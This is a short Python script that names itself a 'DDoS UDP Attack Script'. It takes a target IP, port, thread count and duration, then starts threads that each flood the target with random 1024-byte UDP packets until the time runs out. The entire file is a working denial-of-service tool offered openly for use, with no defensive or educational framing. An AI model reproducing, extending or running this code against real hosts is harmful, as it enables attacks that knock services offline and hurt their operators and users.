#!/usr/bin/python3

import argparse
import socket
import threading
import random
import time

class DDoS:
    def __init__(self, ip, port, duration):
        self.target = ip
        self.port = port
        self.duration = duration

    def attack(self):
        print(f"[*] Starting UDP attack on {self.target}:{self.port} for {self.duration} seconds...")
        start_time = time.time()
        while time.time() - start_time < self.duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)  # Generate random data to send
                s.sendto(data, (self.target, self.port))
                print(f"\033[92m.\033[0m", end="", flush=True)  # Print dot for each packet sent
            except Exception as e:
                print(f"[*] Error: {str(e)}")

            time.sleep(0.01)  # Adjust delay between packets for optimal performance

        print(f"\n[*] UDP attack finished on {self.target}:{self.port}")

def parse_args():
    parser = argparse.ArgumentParser(description="DDoS UDP Attack Script")
    parser.add_argument("--ip", dest="ip", required=True, help="Target IP address")
    parser.add_argument("--port", dest="port", type=int, required=True, help="Target port number")
    parser.add_argument("--threads", dest="threads", type=int, required=True, help="Number of threads to use")
    parser.add_argument("--duration", dest="duration", type=int, required=True, help="Duration of attack in seconds")
    return parser.parse_args()

def main():
    args = parse_args()
    ip = args.ip
    port = args.port
    threads = args.threads
    duration = args.duration

    ddos_threads = []

    for _ in range(threads):
        ddos = DDoS(ip, port, duration)
        ddos_thread = threading.Thread(target=ddos.attack)
        ddos_threads.append(ddos_thread)
        ddos_thread.start()

    for thread in ddos_threads:
        thread.join()

if __name__ == "__main__":
    main()
